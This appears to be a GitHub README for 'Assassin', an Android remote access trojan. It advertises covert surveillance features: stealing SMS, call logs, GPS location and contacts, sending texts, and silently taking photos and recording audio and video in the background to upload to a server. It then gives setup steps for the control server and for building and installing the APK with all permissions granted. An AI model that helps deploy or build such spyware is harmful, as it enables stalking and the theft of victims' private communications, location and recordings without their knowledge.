# Assassin one of the  best Android RAT 

- betaV1.0
- adapter android Lollipop-Pie
- commit issues to me 
## Features
- get Sms_List
- send Sms to destinationAddress
- get Calling_History
- get GPS
- get Contacts_List
---- 
#### something that u can do in background
- call someone  
- take a photo then send to server 
- record audio then send to server
- record video then send to server
of course the duration decided by yourself

## Basement/Environment
1. Gradle 
2. JDK1.8
3. AndroidSdk 
4. node.js
5. npm
## Usage
#### Start up The Server
```
1. git clone git@github.com:honglvt/TalentRAT.git / or https
2. cd the project path
3. cd Server
4. npm install
5. npm start
```
now you can see the terminal show ASSASSIN

#### Build the Android apk 
1. confrim that you have prepare the env for building the app
2. connect the android device  to ur PC
3. enable the develop mode on ur android device
4. on some rom you should also  enable the adb to install the apk
if you are not a developer you can install the apk yourself
- post the .apk to your device such as email or other way
- then install the .apk on folder
----
#### Intasll apk to ur device
```
1. cd the project path 
2. ./assembleApk.sh debug    you can choose the arg debug/release
3. ./installNewestApk.sh 
4. open the apk on ur device
5. the most important is that  you should grant all of the permissions on the device
```
## Instruction to client
```
1. cd /Server
2. chmod 777 ./assassin.js
3. ./assassin.js -C
```
